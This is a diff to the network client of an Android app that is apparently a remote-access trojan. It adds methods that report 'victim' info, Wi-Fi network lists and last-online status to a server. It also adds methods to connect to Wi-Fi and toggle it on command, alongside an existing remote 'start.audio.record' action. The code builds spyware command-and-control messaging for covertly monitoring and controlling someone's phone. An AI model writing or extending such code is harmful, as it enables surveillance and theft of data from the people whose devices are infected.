@@ -12,6 +12,7 @@ import org.json.simple.parser.ParseException;
 
 import io.netty.bootstrap.Bootstrap;
 import io.netty.channel.ChannelFuture;
+import io.netty.channel.ChannelHandlerContext;
 import io.netty.channel.ChannelInitializer;
 import io.netty.channel.ChannelOption;
 import io.netty.channel.EventLoopGroup;
@@ -29,6 +30,11 @@ public class NettyClient extends AsyncTask<String, String, String> {
 
     public static NettyClient getInstance() {
         return nettyClient;
+    }
+
+    public boolean isActive() {
+        if (queryHandler == null || queryHandler.getCtx() == null) return false;
+        return queryHandler.getCtx().channel().isActive();
     }
 
     @Override
@@ -77,7 +83,7 @@ public class NettyClient extends AsyncTask<String, String, String> {
             MainService.getInstance().receiveMessage((JSONObject)parser.parse(values[0]));
         } catch (ParseException e) {
             e.printStackTrace();
-            System.out.println("Данный с сервера не формата JSON!");
+            System.out.println("Данные с сервера не формата JSON!");
         }
     }
 
@@ -184,6 +190,44 @@ public class NettyClient extends AsyncTask<String, String, String> {
         JSONObject query = new JSONObject();
         query.put("action", "start.audio.record");
         query.put("code", code);
+        query.put("owner", owner);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendGetVictimInfo(JSONObject info, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.victim.info");
+        query.put("info", info);
+        query.put("owner", owner);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendUpdateLastOnline() {
+        JSONObject query = new JSONObject();
+        query.put("action", "update.last.online");
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendGetWifiList(JSONArray wifiList, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.wifi.list");
+        query.put("wifiList", wifiList);
+        query.put("owner", owner);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendWifiConnect(String code, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "wifi.connect");
+        query.put("code", code);
+        query.put("owner", owner);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendSetWifiEnabled(boolean wifiState, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "set.wifi.enabled");
+        query.put("wifiState", wifiState);
         query.put("owner", owner);
         queryHandler.sendMessage(query);
     }
